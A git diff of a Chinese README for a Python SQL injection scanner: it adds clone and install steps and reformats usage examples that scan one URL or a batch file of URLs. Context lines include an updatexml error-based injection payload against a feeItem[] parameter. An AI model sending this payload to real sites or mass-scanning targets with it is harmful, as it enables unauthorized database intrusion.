@@ -1,7 +1,4 @@
 # SQL 注入自动化脚本
-[![Exploit](https://img.shields.io/badge/Stage-Exploit-red.svg)]()
-[![Language](https://img.shields.io/badge/Language-Python%203-blue.svg)]()
-[![Target](https://img.shields.io/badge/Vuln-SQL%20Injection-orange.svg)]()
 <p align="left">
   <img src="https://img.shields.io/badge/Stage-Exploit-red.svg" alt="Stage">
   <img src="https://img.shields.io/badge/Language-Python%203-blue.svg" alt="Language">
@@ -32,6 +29,16 @@
 
         feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
 
+Quick Start
+# 1. 克隆本项目仓库到本地
+    git clone [https://github.com/JY-666-YINZI/Python_SQL_inj_test.git](https://github.com/JY-666-YINZI/Python_SQL_inj_test.git)
+
+# 2. 切换进入到脚本所在的根目录下
+    cd Python_SQL_inj_test
+
+# 3. 安装脚本运行所必须的依赖库
+    pip install requests
+
 🚀 脚本运行指南
 🚫 免责声明
 ⚠️ （##免责声明：仅用于科学上网绿色实验健康学习##）
@@ -52,8 +59,8 @@
 并且在使用 -f 读取文件时要注意路径：在文件名称前 + 路径/文件名。可以是相对路径，也可以是绝对路径，总之一定是能让系统识别到的路径才能读取到文件。
 
 🔹 示例 1：检测单个目标 URL (-u)
-Bash
-python3 Read.make.phpSQL注入.py -u yoururl
+
+    python3 Read.make.phpSQL注入.py -u yoururl
 🔹 示例 2：批量读取文本进行扫描 (-f)
-Bash
-python3 Read.make.phpSQL注入.py -f filename.txt
+
+    python3 Read.make.phpSQL注入.py -f filename.txt
